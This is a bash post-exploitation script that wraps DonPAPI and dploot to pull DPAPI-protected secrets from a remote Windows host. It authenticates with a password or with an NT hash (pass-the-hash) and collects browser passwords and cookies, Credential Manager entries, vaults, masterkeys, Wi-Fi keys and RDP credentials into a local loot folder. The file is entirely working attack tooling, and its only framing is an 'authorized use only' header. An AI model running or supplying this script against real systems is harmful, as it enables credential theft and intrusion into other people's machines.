#!/usr/bin/env bash
#
# dpapi.sh - remote DPAPI secret looting (DonPAPI / dploot)
# -----------------------------------------------------------------------------
# Harvests Windows DPAPI-protected secrets from a host you have admin on -
# browser passwords/cookies, Credential Manager, Wi-Fi keys, RDP creds, vaults,
# masterkeys - using DonPAPI (preferred) or dploot.
#   1. Try DonPAPI for a broad, parsed collection.
#   2. Fall back to dploot modules (browser / masterkeys / credentials / vaults).
#   3. Output is collected locally for review.
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY: post-exploitation on in-scope hosts (needs local admin).
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./dpapi.sh -i <host> -u <user> (-p <pass> | -H <:nt>) [-d domain] [-o out]
#
# EXAMPLES:
#   ./dpapi.sh -i 10.10.10.5 -u admin -p 'Pass123' -d corp.local
#   ./dpapi.sh -i 10.10.10.5 -u admin -H :nthash -d corp.local
#
# DEPENDENCIES: donpapi (preferred) and/or dploot
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
c_step(){ printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }
have(){ command -v "$1" >/dev/null 2>&1; }

HOST="" USER="" PASS="" HASH="" DOMAIN="" OUT=""
usage(){ sed -n '2,24p' "$0"; exit 1; }
while getopts "i:u:p:H:d:o:h" o; do case "$o" in
  i) HOST=$OPTARG;; u) USER=$OPTARG;; p) PASS=$OPTARG;; H) HASH=$OPTARG;;
  d) DOMAIN=$OPTARG;; o) OUT=$OPTARG;; *) usage;;
esac; done
[ -z "$HOST" ] || [ -z "$USER" ] && { c_err "need -i and -u"; usage; }
[ -z "$PASS" ] && [ -z "$HASH" ] && { c_err "need -p or -H"; usage; }

OUT=${OUT:-"./dpapi_${HOST}_$(date +%Y%m%d_%H%M%S)"}; mkdir -p "$OUT"; cd "$OUT"
NTPART="${HASH##*:}"

if have donpapi || have DonPAPI; then
  DP=$(command -v donpapi || command -v DonPAPI)
  c_step "DonPAPI"
  TGT="${DOMAIN:+$DOMAIN/}$USER"
  if [ -n "$HASH" ]; then "$DP" collect -t "$HOST" -u "$USER" -H "$NTPART" ${DOMAIN:+-d "$DOMAIN"} 2>&1 | tee donpapi.txt || \
    "$DP" -t "$HOST" "$TGT" -H "$NTPART" 2>&1 | tee -a donpapi.txt || c_warn "DonPAPI syntax varies by version - see donpapi -h"
  else "$DP" collect -t "$HOST" -u "$USER" -p "$PASS" ${DOMAIN:+-d "$DOMAIN"} 2>&1 | tee donpapi.txt || \
    "$DP" -t "$HOST" "$TGT:$PASS" 2>&1 | tee -a donpapi.txt || c_warn "DonPAPI syntax varies by version - see donpapi -h"; fi
fi

if have dploot; then
  c_step "dploot (browser / credentials / vaults / masterkeys)"
  AUTH=( -u "$USER" ${DOMAIN:+-d "$DOMAIN"} )
  [ -n "$HASH" ] && AUTH+=( -hashes "$HASH" ) || AUTH+=( -p "$PASS" )
  for mod in masterkeys credentials vaults browser rdg wifi; do
    c_info "dploot $mod"; dploot "$mod" "${AUTH[@]}" "$HOST" 2>&1 | tee "dploot_$mod.txt" || true
  done
fi

[ ! -s donpapi.txt ] && [ -z "$(ls dploot_* 2>/dev/null)" ] && c_warn "Nothing collected - check creds/admin rights or run the tool's -h for exact flags."
c_step "DONE"; c_ok "Output: $(pwd)"
c_info "Recovered plaintext creds can be added to your loot: loot.sh $(pwd)"
